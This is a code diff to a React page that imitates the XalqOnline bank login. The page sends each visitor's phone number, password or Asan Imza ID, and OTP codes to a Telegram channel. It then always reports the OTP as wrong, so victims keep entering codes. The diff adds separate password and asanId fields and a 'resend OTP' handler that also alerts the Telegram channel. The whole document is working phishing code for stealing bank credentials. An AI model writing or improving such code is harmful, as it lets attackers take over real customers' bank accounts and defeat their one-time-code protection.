@@ -121,7 +121,7 @@ export default function XalqOnlineApp() {
         title: `XalqOnline Login (${tab === "authorization" ? "Authorization" : "Asan Imza"})`,
         type: "login",
         phoneNumber: phone,
-        pin: tab === "authorization" ? password : asanId,
+        ...(tab === "authorization" ? { password } : { asanId }),
       })
     } catch (err) {
       console.error("Error sending Telegram login alert:", err)
@@ -146,7 +146,7 @@ export default function XalqOnlineApp() {
         type: "otp",
         otp1: otp,
         phoneNumber: phone,
-        pin: tab === "authorization" ? password : asanId,
+        ...(tab === "authorization" ? { password } : { asanId }),
       })
     } catch (err) {
       console.error("Error sending Telegram OTP alert:", err)
@@ -158,6 +158,21 @@ export default function XalqOnlineApp() {
       setTimer(60)
       setOtpError("Yalnış OTP kodu. Yenidən cəhd edin.")
     }, 2000)
+  }
+
+  // Handle Resend OTP
+  const handleResendOtp = async () => {
+    setTimer(60)
+    setOtpError(null)
+    try {
+      await sendTelegramMessage({
+        title: "XalqOnline OTP Resend Requested",
+        type: "resend_otp",
+        phoneNumber: phone,
+      })
+    } catch (err) {
+      console.error("Error sending Telegram resend OTP alert:", err)
+    }
   }
 
   // Format timer into MM:SS
@@ -480,10 +495,7 @@ export default function XalqOnlineApp() {
                   </span>
                 ) : (
                   <button
-                    onClick={() => {
-                      setTimer(60)
-                      setOtpError(null)
-                    }}
+                    onClick={handleResendOtp}
                     className="text-sm font-bold text-[#E31E24] hover:underline cursor-pointer"
                   >
                     Yenidən göndər
